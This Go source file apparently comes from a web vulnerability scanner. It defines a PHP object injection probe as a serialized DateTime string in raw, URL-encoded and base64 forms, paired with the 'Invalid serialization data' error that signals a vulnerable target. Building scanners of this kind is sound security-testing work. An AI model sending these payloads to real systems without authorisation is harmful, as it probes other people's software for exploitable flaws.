package payload

// ObjectInjection object
type ObjectInjection struct {
	input       [][]byte
	output      []byte
	description string
}

// NewObjectInjection create a new object injection payload
func NewObjectInjection() ObjectInjection {
	// nolint:lll
	return ObjectInjection{
		input: [][]byte{
			[]byte(`O:8:"DateTime":3:{s:6:"inject";s:26:"2018-10-28%2000:00:00.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:6:"inject";}`),
			[]byte(`O%3A8%3A%22DateTime%22%3A3%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%222018-10-28%252000%3A00%3A00.000000%22%3Bs%3A13%3A%22timezone_type%22%3Bi%3A3%3Bs%3A8%3A%22timezone%22%3Bs%3A6%3A%22inject%22%3B%7D`),
			[]byte(`Tzo4OiJEYXRlVGltZSI6Mzp7czo2OiJpbmplY3QiO3M6MjY6IjIwMTgtMTAtMjglMjAwMDowMDowMC4wMDAwMDAiO3M6MTM6InRpbWV6b25lX3R5cGUiO2k6MztzOjg6InRpbWV6b25lIjtzOjY6ImluamVjdCI7fQ==`),
		},
		output:      []byte(`Invalid serialization data`),
		description: "PHP Object Injection",
	}
}

// Input get the payload input
func (o ObjectInjection) Input() [][]byte {
	return o.input
}

// Output get the expected output of a vulnerable target
func (o ObjectInjection) Output() []byte {
	return o.output
}

// Description one-liner description for the vulnerability
func (o ObjectInjection) Description() string {
	return o.description
}
